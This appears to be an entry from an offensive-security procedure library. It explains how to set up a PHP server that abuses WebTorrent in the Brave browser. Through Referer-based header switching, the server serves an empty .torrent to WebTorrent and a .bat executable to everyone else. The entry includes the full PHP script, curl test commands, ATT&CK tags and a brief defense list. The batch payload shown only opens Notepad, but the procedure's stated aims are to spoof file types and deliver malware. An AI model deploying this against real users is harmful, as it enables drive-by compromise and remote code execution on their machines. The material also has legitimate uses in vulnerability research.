---
id: proc-uuid-1
tags:
  - webtorrent
  - php
  - server-spoofing
type: procedure
tools:
  - '[[tools/PHP]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/malicious-php-torrent-server]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
updated_at: '2025-12-14T17:23:28.260Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Set-Up-Malicious-PHP-Torrent-Server

## Summary

This procedure deploys a PHP-based web server that exploits WebTorrent's reliance on headers by serving a fake .torrent file to Brave's requests (detected via Referer) and a malicious .bat executable to others, enabling file spoofing for downstream attacks.

## Description

The attack targets WebTorrent in Brave browser, which validates downloads based on Content-Disposition and Content-Type headers without deeper checks. The server uses PHP to inspect the HTTP Referer: if present (as sent by WebTorrent), it responds with benign torrent headers; otherwise, it delivers a .bat payload. This setup allows tricking users into downloading and executing malware disguised as a torrent, leading to RCE on Windows. Prerequisites include a PHP-enabled hosting environment.

## Requirements

1. PHP-enabled web server (e.g., Apache with PHP module)
2. Publicly accessible URL for the demo page and endpoint
3. Basic web development knowledge for deployment

## Defense

Defensive measures and detection strategies:

- Disable or restrict WebTorrent extensions in browsers
- Implement content verification beyond headers (e.g., file signature checks)
- Monitor for anomalous Referer-based responses in server logs
- Educate users on verifying downloads before execution

## Objectives

1. Establish a server that differentiates responses based on client headers
2. Spoof file types to bypass browser validation
3. Facilitate malware delivery via trusted download mechanisms

## Instructions

### Step 1: Create PHP Script

**Context**: Write the PHP code to handle header-based response switching.

**Command** ([[commands/malicious-php-torrent-server]]):
```php
<?php
if(isset($_SERVER['HTTP_REFERER'])){
header("Content-Disposition: attachment; filename='PoC.torrent'; filename*=UTF-8''PoC.torrent");
header("Content-Type: application/octet-stream");
}
else{
header("Content-Disposition: attachment; filename='PoC.bat'; filename*=UTF-8''PoC.bat");
header("Content-Type: application/x-bat");
echo"@echo off\n";
echo"START C:\\Windows\\NOTEPAD.EXE";
}
?>
```

> This script checks for HTTP_REFERER; if set, sends torrent headers (empty body); else, sends .bat headers and payload. Deploy as test-driver.php.

### Step 2: Deploy and Test Server

**Context**: Host the script and verify behavior.

**Instructions**: Upload to a server (e.g., cfapps.io). Test with curl:

```bash
curl -H "Referer: https://example.com" https://yourserver/test-driver.php -o test.torrent
curl https://yourserver/test-driver.php -o test.bat
```

> Expected: test.torrent is empty with torrent headers; test.bat contains executable content.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used

- [[commands/malicious-php-torrent-server]]

## Tools Used

- [[tools/PHP]]

## Tags

- webtorrent
- php
- spoofing
